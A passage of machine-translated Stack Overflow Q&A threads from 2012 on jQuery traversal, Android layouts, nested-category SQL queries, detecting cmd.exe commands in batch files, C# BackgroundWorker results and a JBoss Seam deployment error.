        .removeClass('active');
}); 
```

但我想做的是：

```
var relation = function() {
    return $(this).parent().siblings().find('a.active');
};

$('a').click(function() {
    $(this).addClass('active').find(relation).removeClass('active');
}); 
```

看到不同？现在，`find`不把函数作为参数，所以我写了这样的东西：

```
$.fn.traverse = function(fn) {
    return $.isFunction(fn) ? fn.call(this) : this;
}; 
```

例如，这个简单的方法可以创建一个“激活”插件，让作者指定与停用的关系：

```
$.fn.activate = function(fn) {
    return this.each(function() {
        $(this).addClass('active').traverse(fn || function() {
            return $(this).siblings();
        }).removeClass('active');
    });
}); 
```

并像这样使用它：

```
$('a').activate(function() {
    return $(this).parent().siblings().find('.active');
});

// or

$('a').activate(function() {
    return $(this).closest('ul').find('a.active').not(this);
});

// or

$('li').activate(); 
```

这将完成这项工作。但我的问题是，jQuery 中确实应该包含类似的东西，不是吗？我正在看，`.map`但它不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T14:55:22.903

jQuery 中通常的模式是：

*   找到要更改的元素，然后

*   调用一个方法对他们做某事。

*您可以*通过许多其他方式来做事，但这种方式工作得很好，这也是图书馆设计的工作方式。我需要一个令人信服的理由才能摆脱这一点。（不仅仅是“但我想这样做。”）

我会这样写：

```
$('a').click(function() {
    $(this).closest('ul').find('a.active').removeClass('active');
    $(this).addClass('active');
}); 
```

链接被高估了。如果你想做两件事，试着写两行代码。你可能会喜欢它！

# android - 底部带有 TextView 的 FrameLayout

> ID：12624038
> 
> 赞同：5
> 
> 时间：2012-09-27T14:43:56.967
> 
> 标签：android, android-layout

我有这样的 FrameLayout。它包含两个重叠的图像：

```
<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/my_frame"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent">

    <ImageView 
        android:id="@+id/image_areas"
        android:layout_width="fill_parent" 
        android:layout_height="fill_parent" 
        android:scaleType="fitCenter"
        android:src="@drawable/image_mask"
        android:visibility="invisible"/>
    <ImageView
        android:id="@+id/image"
        android:layout_width="fill_parent" 
        android:layout_height="fill_parent" 
        android:scaleType="fitCenter"
        android:src="@drawable/walker"/>

</FrameLayout> 
```

我想在`TextView`这个下面添加一个`FrameLayout`。是否有可能或确实`FrameLayout`占用了屏幕上的所有空间？我可以把我的 FrameLayout 和 TextView 放在某种 `LinearLayout`?

**编辑：**问题是`TextView`当我将它与我的 FrameLayout 一起放入 LinearLayout 或 RelaiveLayout 时，我没有显示。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-27T14:55:27.877

您可以使用 a`RelativeLayout`来保存您的`FrameLayout`和`TextView`在您`FrameLayout`使用中的`android:layout_above`属性。像这样的东西：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
 android:layout_width="fill_parent"
 android:layout_height="fill_parent" >

<FrameLayout
    android:id="@+id/my_frame"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_above="@+id/TextViewId" >

    <ImageView
        android:id="@+id/image_areas"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:scaleType="fitCenter"
        android:src="@android:drawable/alert_dark_frame"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/image"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:scaleType="fitCenter"
        android:src="@android:drawable/btn_dialog" />
</FrameLayout>

<TextView
    android:id="@+id/TextViewId"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:text="TextView text" />

</RelativeLayout> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-11-24T17:34:18.430

```
<FrameLayout
    android:id="@+id/my_frame"
    android:layout_width="match_parent"
    android:layout_height="match_parent">

    <ImageView
        android:id="@+id/image_areas"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:scaleType="fitCenter"
        android:src="@android:drawable/alert_dark_frame"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/image"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:scaleType="fitCenter"
        android:src="@android:drawable/btn_dialog" />

    <TextView
        android:id="@+id/TextViewId"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="bottom"
        android:text="layout_gravity is the key here..."/>
</FrameLayout> 
```

# php - 显示主分类中子分类的文章 PHP MYSQL

> ID：12624042
> 
> 赞同：1
> 
> 时间：2012-09-27T14:44:02.760
> 
> 标签：php, mysql

我有一个类别表

```
cat_id, cat_name, parent_id, cat_slug 
```

我的文章表如下

```
art_id, cat_id, art_title, art_content, author_id ..... 
```

我的用户表为

```
user_id, username, pw, ..... 
```

所以有了这些数据，我想显示子类别下列出的所有文章

例如：

主类 url 为：mydomain.com/cat/business 子类 url 为：mydomian.com/cat/business/advertising

因此，当人们访问主类别时，即使 cat_id 没有作为主类别提及，它也应该在主类别上显示列出的子类别文章。我想在业务类别页面上列出业务子类别文章的所有子类别。

什么是查询，我应该尝试实现这一点

帮助将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T14:50:39.533

首先，要获取您的类别...

如果您的类别嵌套只有两个级别（父级和子级）或者您只对直接子类别感兴趣（即不是子类别的子类别），那么您的 SQL 非常简单：

```
SELECT cat_id FROM category_table WHERE cat_id = $catid OR parent_id = $catid 
```

如果您的嵌套更深，那么您需要递归查询到您的类别嵌套为止。例如，如果您将自己限制在 3 个级别，您可以使用 SQL 执行此操作，如下所示：

```
SELECT cat_id FROM category_table ct1
WHERE cat_id = $catid OR parent_id = $catid
OR parent_id in (SELECT cat_id FROM category_table WHERE parent_id = ct1.cat_id) 
```

同样，对于 4 级深度嵌套，您可以使 SQL 更加复杂：

```
SELECT cat_id FROM category_table ct1
WHERE cat_id = $catid OR parent_id = $catid
OR parent_id in (SELECT cat_id FROM category_table ct2 WHERE parent_id = ct1.cat_id
                 OR parent_id in
                 (SELECT cat_id FROM category_table ct3 WHERE parent_id = ct2.cat_id)) 
```

等等。

如果您没有固定的嵌套深度，则需要在代码中进行循环。

拥有所有类别后，您就可以查询文章。所以对于一个简单的 2 级依赖，你会得到

```
SELECT * FROM article_table
WHERE cat_id in (SELECT cat_id FROM category_table WHERE cat_id = $catid OR parent_id = $catid) 
```

同样，对于 3 级嵌套，您将得到

```
SELECT * FROM article_table
WHERE cat_id in
    (SELECT cat_id FROM category_table ct1
     WHERE cat_id = $catid OR parent_id = $catid
     OR parent_id in (SELECT cat_id FROM category_table WHERE parent_id = ct1.cat_id)) 
```

等等...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T14:48:55.200

```
select * from category where parent_id=cat_id 
```

这里对于给定的 cat_id，它将为此获取所有子类别。

# batch-file - 如何测试 cmd.exe 命令是否存在？

> ID：12624044
> 
> 赞同：4
> 
> 时间：2012-09-27T14:44:06.583
> 
> 标签：batch-file, dos, cmd

例如，在 Windows 7`mklink`上可用，`cmd.exe /C mklink`但在 Windows XP 上不可用。

除了执行`cmd.exe /C mklink`和尝试读取之外，`errorlevel`是否有更简单的方法来测试 cmd.exe 是否支持命令？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T17:02:07.957

`ERRORLEVEL`of不是命令存在的`cmd`良好指标，因为如果命令不存在或失败，它会设置为非零值，这可能会导致您的测试失败。

或者，您可以执行以下操作之一：

### 检查操作系统版本

就像 Adriano 在评论中建议的那样，可以像这样检查 Windows 的版本：

```
set mklink_supported=true
ver | find "XP" >nul 2>&1 && set mklink_supported=false 
```

或者像这样：

```
set mklink_supported=false
echo %vers% | find "Windows 7" >nul 2>&1 && set mklink_supported=true 
```

进而：

```
if %mklink_supported%==false (
    echo 'mklink' is not supported on this operating system.
) 
```

或类似的东西。不过，您需要确保处理所有必要的操作系统版本。

### 测试运行命令并检查`ERRORLEVEL`

或者，您可以尝试`mklink`直接运行。如果未找到，`ERRORLEVEL`则设置为`9009`：

```
@echo off
mklink >nul 2>&1
if errorlevel 9009 if not errorlevel 9010 (
    echo 'mklink' is not supported on this operating system.
) 
```

请注意，有两个`if`- 语句。`if errorlevel 9009`如果`ERRORLEVEL`>=9009 则有效，因此需要第二个`if`语句来排除`ERRORLEVEL`>9009 时的情况）。

我更喜欢第二种解决方案，因为它预计适用于所有版本的 Windows。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T17:59:40.207

要找到可执行文件，您可以在`for`循环中使用变量扩展：

```
setlocal EnableDelayedExpansion
set found=no
for %%f in (mklink.exe) do if exist "%%~$PATH:f" set found=yes
echo %found%
endlocal 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-27T18:31:31.060

```
@echo off 
(for /f %%F in ('help') do echo '%%F ')|findstr /i /c:"%1 " 2>&1 >nul && echo Supported || echo Not supported 
```

这取决于一个事实，该事实`help` *似乎包括*相当完整的内部命令列表（以及相当多的外部命令）。它需要命令名称作为它的参数 ( `isSupported.bat command_name`)

它实际上并没有测试给定的命令是否执行，只有当它应该存在时......
这只是一个想法，请**尝试**使其无效，如果你这样做，我会很乐意删除。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-05T21:09:51.607

[不久前，我在 SS64 Windows CMD Shell 论坛上](http://ss64.org/viewtopic.php?id=1479)发布了这个批处理脚本。它将 wmz 和 Ansgar Wiechers 答案中的想法结合到一个方便的包中。

它尝试在 PATH 中的某处定位给定的可执行文件，如果找不到，则搜索 HELP。如果 HELP 涵盖的标准实用程序丢失，它可能会给出错误的结果和一些丑陋的错误消息。

```
::WHICH.BAT  CommandName  [ReturnVar]
::
::  Determines the full path of the file that would execute if
::  CommandName were executed.
::
::  The result is stored in variable ReturnVar, or else it is
::  echoed to stdout if ReturnVar is not specified.
::
::  If no file is found, then an error message is echoed to stderr.
::
::  The ERRORLEVEL is set to one of the following values
::    0 - Success: A matching file was found
::    1 - No file was found and CommandName is an internal command
::    2 - No file was found and CommandName is not an internal command
::    3 - Improper syntax - no CommandName specified
::
@echo off
setlocal disableDelayedExpansion
set "file=%~1"
if not defined file (
  >&2 echo Syntax error: No CommandName specified
  exit /b 3
)
set "noExt="
setlocal enableDelayedExpansion
if "%~x1" neq "" if "!PATHEXT:%~x1=!" neq "!PATHEXT!" set noExt="";
set "modpath=.\;!PATH!"
@for %%E in (%noExt%%PATHEXT%) do @for %%F in ("!file!%%~E") do (
  setlocal disableDelayedExpansion
  if not "%%~$modpath:F"=="" if not exist "%%~$modpath:F\" (
    endlocal & endlocal & endlocal
    if "%~2"=="" (echo %%~$modpath:F) else set "%~2=%%~$modpath:F"
    exit /b 0
  )
  endlocal
)
endlocal
>nul help %~1 && (
  >&2 echo "%~1" is not a valid command
  exit /b 2
)
>&2 echo "%~1" is an internal command 
```

# c# - 确定两个 BackGroundWorker 字符串是否返回 true

> ID：12624046
> 
> 赞同：2
> 
> 时间：2012-09-27T14:44:10.827
> 
> 标签：c#, multithreading

问题：检查两个 BackgroundWorkers 是否返回 true 的最佳方法是什么，或者两者都没有返回 true，或者只有一个返回 true。

附加信息：

我有两个 BackgroundWorker 目前正在检查两个 SQL 连接是否有效，并根据连接是否成功返回一个值。

代码如下：

```
private void btnTestSConnection_Click(object sender, EventArgs e)
        {
            BackgroundWorker work1 = new BackgroundWorker { WorkerSupportsCancellation = true };
            BackgroundWorker work2 = new BackgroundWorker { WorkerSupportsCancellation = true };
            work1.RunWorkerCompleted += (item, a) =>
            {
                //need to figure out this portion
            };
            work2.RunWorkerCompleted += (item, a) =>
            {
                //need to figure out this portion
            };

            work1.DoWork += doWork;
            work2.DoWork += doWork;

            SourceString.InitialCatalog = txtSSourceDatabase.Text;
            work1.RunWorkerAsync(SourceString.ConnectionString);
            SourceString.InitialCatalog = txtSSystemDatabase.Text;
            work2.RunWorkerAsync(SourceString.ConnectionString);
        }

DoWorkEventHandler doWork = (sender, e) =>
        {
            SqlConnection Connection;
            BackgroundWorker worker = sender as BackgroundWorker;
            for (int i = 1; (i <= 10); i++)
            {
                    try
                    {
                        using (Connection = new SqlConnection((string)e.Argument))
                        {
                            Connection.Open();
                        }
                        e.Result = true;
                    }
                    catch (SqlException c)
                    {
                        e.Result = false;
                    }
                }
        }; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:15:16.127

您可能会返回一个 KeyValuePair，其中第一个 bool 表示使用了哪个 worker（对于 work1，true，对于 work2 是 false），第二个 bool 是 DoWork 方法的返回值，如下所示：

```
work1.DoWork += doWork;
work2.DoWork += doWork;

work1.RunWorkerAsync(true);
work2.RunWorkerAsync(false);

private void doWork(s, e)
{
  var kvp = new KeyValuePair<bool, bool>;
  kvp.Key = e.Argument as bool; // this indicate which of the worker returned a value
  ...
  using (Connection = new SqlConnection((string)e.Argument))
  {
    Connection.Open();
  }
  kvp.Value = true; // this is the result of your connection test
  ...
  e.Result = kvp
}; 
```

现在在您的 RunWorkerCompleted 上，您可以将 Result 转换为 KeyValuePair 并获取 work1 或 work2 是否返回了哪个值。

```
b.RunWorkerCompleted += (item, a) =>
{
  var kvp = a.Result as KeyValuePair<bool, bool>;
  //kvp.Key == true mean this is the work1
  //kvp.Value is the SQL connection test
}; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T16:19:05.763

您可以`volatile`在布尔变量上使用关键字。并在线程内更改其值。并在完成后或工作过程中的任何时间检查

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-27T15:01:25.473

您可以使用[等待句柄](http://msdn.microsoft.com/en-us/library/system.threading.eventwaithandle.aspx)在每次完成时触发事件。

```
private void btnTestSConnection_Click(object sender, EventArgs e)
        {
            EventWaitHandle firstComplete = new EventWaitHandle(false, EventResetMode.ManualReset);
            EventWaitHandle secondComplete = new EventWaitHandle(false, EventResetMode.ManualReset);

                bool overallResult = false;

            BackgroundWorker work1 = new BackgroundWorker { WorkerSupportsCancellation = true };
            BackgroundWorker work2 = new BackgroundWorker { WorkerSupportsCancellation = true };
            work1.RunWorkerCompleted += (item, a) =>
            {
                firstComplete.Set();
                //need to figure out this portion
                overallResult &= a.Result 
            };
            work2.RunWorkerCompleted += (item, a) =>
            {
                secondComplete.Set();
                //need to figure out this portion
                overallResult &= a.Result 
            };

            work1.DoWork += doWork;
            work2.DoWork += doWork;

            SourceString.InitialCatalog = txtSSourceDatabase.Text;
            work1.RunWorkerAsync(SourceString.ConnectionString);
            SourceString.InitialCatalog = txtSSystemDatabase.Text;
            work2.RunWorkerAsync(SourceString.ConnectionString);

            // Wait on First will not go until set
            firstComplete.WaitOne();

            // Wait on second
            secondComplete.WaitOne();

            // Both now complete
            //Do what you need to now
        }

DoWorkEventHandler doWork = (sender, e) =>
        {
            SqlConnection Connection;
            BackgroundWorker worker = sender as BackgroundWorker;
            for (int i = 1; (i <= 10); i++)
            {
                    try
                    {
                        using (Connection = new SqlConnection((string)e.Argument))
                        {
                            Connection.Open();
                        }
                        e.Result = true;
                    }
                    catch (SqlException c)
                    {
                        e.Result = false;
                    }
                }
        }; 
```

# java - java.lang.RuntimeException：读取 /WEB-INF/components.xml 时出错

> ID：12624049
> 
> 赞同：0
> 
> 时间：2012-09-27T14:44:25.850
> 
> 标签：java, jboss, seam, jboss5.x

我正在尝试在 Jboss 5.1.0.GA 上部署我的 Seam 应用程序，但我遇到了一个非常奇怪的错误：

**原因：org.dom4j.DocumentException：org.dom4j.DocumentFactory 无法转换为 org.dom4j.DocumentFactory 嵌套异常：org.dom4j.DocumentFactory 无法转换为 org.dom4j.DocumentFactory**

我正在从 Jboss 4.3.0 迁移，也许我错过了一些步骤？下面的堆栈跟踪：

```
16:48:58,964 ERROR [[/]] Exception sending context initialized event to listener instance of class org.jboss.seam.servlet.SeamListener
java.lang.RuntimeException: error while reading /WEB-INF/components.xml
    at org.jboss.seam.init.Initialization.initComponentsFromXmlDocument(Initialization.java:233)
    at org.jboss.seam.init.Initialization.create(Initialization.java:135)
    at org.jboss.seam.servlet.SeamListener.contextInitialized(SeamListener.java:36)
    at org.apache.catalina.core.StandardContext.listenerStart(StandardContext.java:3910)
    at org.apache.catalina.core.StandardContext.start(StandardContext.java:4393)
    at org.jboss.web.tomcat.service.deployers.TomcatDeployment.performDeployInternal(TomcatDeployment.java:310)
    at org.jboss.web.tomcat.service.deployers.TomcatDeployment.performDeploy(TomcatDeployment.java:142)
    at org.jboss.web.deployers.AbstractWarDeployment.start(AbstractWarDeployment.java:461)
    at org.jboss.web.deployers.WebModule.startModule(WebModule.java:118)
    at org.jboss.web.deployers.WebModule.start(WebModule.java:97)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:157)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:96)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:88)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:668)
    at org.jboss.system.microcontainer.ServiceProxy.invoke(ServiceProxy.java:206)
    at $Proxy38.start(Unknown Source)
    at org.jboss.system.microcontainer.StartStopLifecycleAction.installAction(StartStopLifecycleAction.java:42)
    at org.jboss.system.microcontainer.StartStopLifecycleAction.installAction(StartStopLifecycleAction.java:37)
    at org.jboss.dependency.plugins.action.SimpleControllerContextAction.simpleInstallAction(SimpleControllerContextAction.java:62)
    at org.jboss.dependency.plugins.action.AccessControllerContextAction.install(AccessControllerContextAction.java:71)
    at org.jboss.dependency.plugins.AbstractControllerContextActions.install(AbstractControllerContextActions.java:51)
    at org.jboss.dependency.plugins.AbstractControllerContext.install(AbstractControllerContext.java:348)
    at org.jboss.system.microcontainer.ServiceControllerContext.install(ServiceControllerContext.java:286)
    at org.jboss.dependency.plugins.AbstractController.install(AbstractController.java:1631)
    at org.jboss.dependency.plugins.AbstractController.incrementState(AbstractController.java:934)
    at org.jboss.dependency.plugins.AbstractController.resolveContexts(AbstractController.java:1082)
    at org.jboss.dependency.plugins.AbstractController.resolveContexts(AbstractController.java:984)
    at org.jboss.dependency.plugins.AbstractController.change(AbstractController.java:822)
    at org.jboss.dependency.plugins.AbstractController.change(AbstractController.java:553)
    at org.jboss.system.ServiceController.doChange(ServiceController.java:688)
    at org.jboss.system.ServiceController.start(ServiceController.java:460)
    at org.jboss.system.deployers.ServiceDeployer.start(ServiceDeployer.java:163)
    at org.jboss.system.deployers.ServiceDeployer.deploy(ServiceDeployer.java:99)
    at org.jboss.system.deployers.ServiceDeployer.deploy(ServiceDeployer.java:46)
    at org.jboss.deployers.spi.deployer.helpers.AbstractSimpleRealDeployer.internalDeploy(AbstractSimpleRealDeployer.java:62)
    at org.jboss.deployers.spi.deployer.helpers.AbstractRealDeployer.deploy(AbstractRealDeployer.java:50)
    at org.jboss.deployers.plugins.deployers.DeployerWrapper.deploy(DeployerWrapper.java:171)
    at org.jboss.deployers.plugins.deployers.DeployersImpl.doDeploy(DeployersImpl.java:1439)
    at org.jboss.deployers.plugins.deployers.DeployersImpl.doInstallParentFirst(DeployersImpl.java:1157)
    at org.jboss.deployers.plugins.deployers.DeployersImpl.doInstallParentFirst(DeployersImpl.java:1178)
    at org.jboss.deployers.plugins.deployers.DeployersImpl.doInstallParentFirst(DeployersImpl.java:1210)
    at org.jboss.deployers.plugins.deployers.DeployersImpl.install(DeployersImpl.java:1098)
    at org.jboss.dependency.plugins.AbstractControllerContext.install(AbstractControllerContext.java:348)
    at org.jboss.dependency.plugins.AbstractController.install(AbstractController.java:1631)
    at org.jboss.dependency.plugins.AbstractController.incrementState(AbstractController.java:934)
    at org.jboss.dependency.plugins.AbstractController.resolveContexts(AbstractController.java:1082)
    at org.jboss.dependency.plugins.AbstractController.resolveContexts(AbstractController.java:984)
    at org.jboss.dependency.plugins.AbstractController.change(AbstractController.java:822)
    at org.jboss.dependency.plugins.AbstractController.change(AbstractController.java:553)
    at org.jboss.deployers.plugins.deployers.DeployersImpl.process(DeployersImpl.java:781)
    at org.jboss.deployers.plugins.main.MainDeployerImpl.process(MainDeployerImpl.java:702)
    at org.jboss.deployment.MainDeployer.deploy(MainDeployer.java:830)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:157)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:96)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:88)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:668)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.jboss.jmx.connector.invoker.InvokerAdaptorService.invoke(InvokerAdaptorService.java:263)
    at sun.reflect.GeneratedMethodAccessor271.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:157)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:96)
    at org.jboss.mx.interceptor.AbstractInterceptor.invoke(AbstractInterceptor.java:138)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:90)
    at org.jboss.mx.interceptor.ModelMBeanOperationInterceptor.invoke(ModelMBeanOperationInterceptor.java:140)
    at org.jboss.jmx.connector.invoker.SerializableInterceptor.invoke(SerializableInterceptor.java:74)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:90)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:668)
    at org.jboss.invocation.jrmp.server.JRMPProxyFactory.invoke(JRMPProxyFactory.java:180)
    at sun.reflect.GeneratedMethodAccessor270.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:157)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:96)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:88)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:668)
    at org.jboss.invocation.jrmp.server.JRMPInvoker$MBeanServerAction.invoke(JRMPInvoker.java:855)
    at org.jboss.invocation.jrmp.server.JRMPInvoker.invoke(JRMPInvoker.java:422)
    at sun.reflect.GeneratedMethodAccessor269.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:303)
    at sun.rmi.transport.Transport$1.run(Transport.java:159)
    at java.security.AccessController.doPrivileged(Native Method)
    at sun.rmi.transport.Transport.serviceCall(Transport.java:155)
    at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:535)
    at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:790)
    at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:649)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java.lang.Thread.run(Thread.java:680)
**Caused by: org.dom4j.DocumentException: org.dom4j.DocumentFactory cannot be cast to org.dom4j.DocumentFactory Nested exception: org.dom4j.DocumentFactory cannot be cast to org.dom4j.DocumentFactory**
    at org.dom4j.io.SAXReader.read(SAXReader.java:484)
    at org.dom4j.io.SAXReader.read(SAXReader.java:343)
    at org.jboss.seam.util.XML.getRootElement(XML.java:24)
    at org.jboss.seam.init.Initialization.initComponentsFromXmlDocument(Initialization.java:229)
    ... 106 more
16:48:58,967 ERROR [StandardContext] Error listenerStart
16:48:58,967 ERROR [StandardContext] Context [] startup failed due to previous errors
16:48:58,990 ERROR [AbstractKernelController] Error installing to Start: name=jboss.web.deployment:war=/ state=Create mode=Manual requiredState=Installed
org.jboss.deployers.spi.DeploymentException: URL file:/Users/kalle/Packages/jboss-5.1.0.GA/server/default/tmp/5c4o02t-2xt4l5-h7lz937z-1-h7lz9xcv-9f/reco.ear/WEB.war/ deployment failed
    at org.jboss.web.tomcat.service.deployers.TomcatDeployment.performDeployInternal(TomcatDeployment.java:331)
    at org.jboss.web.tomcat.service.deployers.TomcatDeployment.performDeploy(TomcatDeployment.java:142)
    at org.jboss.web.deployers.AbstractWarDeployment.start(AbstractWarDeployment.java:461)
    at org.jboss.web.deployers.WebModule.startModule(WebModule.java:118)
    at org.jboss.web.deployers.WebModule.start(WebModule.java:97)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:157)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:96)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:88)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:668)
    at org.jboss.system.microcontainer.ServiceProxy.invoke(ServiceProxy.java:206)
    at $Proxy38.start(Unknown Source)
    at org.jboss.system.microcontainer.StartStopLifecycleAction.installAction(StartStopLifecycleAction.java:42)
    at org.jboss.system.microcontainer.StartStopLifecycleAction.installAction(StartStopLifecycleAction.java:37)
    at org.jboss.dependency.plugins.action.SimpleControllerContextAction.simpleInstallAction(SimpleControllerContextAction.java:62)
    at org.jboss.dependency.plugins.action.AccessControllerContextAction.install(AccessControllerContextAction.java:71)
    at org.jboss.dependency.plugins.AbstractControllerContextActions.install(AbstractControllerContextActions.java:51)
    at org.jboss.dependency.plugins.AbstractControllerContext.install(AbstractControllerContext.java:348)
    at org.jboss.system.microcontainer.ServiceControllerContext.install(ServiceControllerContext.java:286)
    at org.jboss.dependency.plugins.AbstractController.install(AbstractController.java:1631)
    at org.jboss.dependency.plugins.AbstractController.incrementState(AbstractController.java:934)
    at org.jboss.dependency.plugins.AbstractController.resolveContexts(AbstractController.java:1082)
    at org.jboss.dependency.plugins.AbstractController.resolveContexts(AbstractController.java:984)
    at org.jboss.dependency.plugins.AbstractController.change(AbstractController.java:822)
    at org.jboss.dependency.plugins.AbstractController.change(AbstractController.java:553)
    at org.jboss.system.ServiceController.doChange(ServiceController.java:688)
    at org.jboss.system.ServiceController.start(ServiceController.java:460)
    at org.jboss.system.deployers.ServiceDeployer.start(ServiceDeployer.java:163)
    at org.jboss.system.deployers.ServiceDeployer.deploy(ServiceDeployer.java:99)
    at org.jboss.system.deployers.ServiceDeployer.deploy(ServiceDeployer.java:46)
    at org.jboss.deployers.spi.deployer.helpers.AbstractSimpleRealDeployer.internalDeploy(AbstractSimpleRealDeployer.java:62)
    at org.jboss.deployers.spi.deployer.helpers.AbstractRealDeployer.deploy(AbstractRealDeployer.java:50)
    at org.jboss.deployers.plugins.deployers.DeployerWrapper.deploy(DeployerWrapper.java:171)
    at org.jboss.deployers.plugins.deployers.DeployersImpl.doDeploy(DeployersImpl.java:1439)
    at org.jboss.deployers.plugins.deployers.DeployersImpl.doInstallParentFirst(DeployersImpl.java:1157)
    at org.jboss.deployers.plugins.deployers.DeployersImpl.doInstallParentFirst(DeployersImpl.java:1178)
    at org.jboss.deployers.plugins.deployers.DeployersImpl.doInstallParentFirst(DeployersImpl.java:1210)
    at org.jboss.deployers.plugins.deployers.DeployersImpl.install(DeployersImpl.java:1098)
    at org.jboss.dependency.plugins.AbstractControllerContext.install(AbstractControllerContext.java:348)
    at org.jboss.dependency.plugins.AbstractController.install(AbstractController.java:1631)
    at org.jboss.dependency.plugins.AbstractController.incrementState(AbstractController.java:934)
    at org.jboss.dependency.plugins.AbstractController.resolveContexts(AbstractController.java:1082)
    at org.jboss.dependency.plugins.AbstractController.resolveContexts(AbstractController.java:984)
    at org.jboss.dependency.plugins.AbstractController.change(AbstractController.java:822)
    at org.jboss.dependency.plugins.AbstractController.change(AbstractController.java:553)
    at org.jboss.deployers.plugins.deployers.DeployersImpl.process(DeployersImpl.java:781)
    at org.jboss.deployers.plugins.main.MainDeployerImpl.process(MainDeployerImpl.java:702)
    at org.jboss.deployment.MainDeployer.deploy(MainDeployer.java:830)
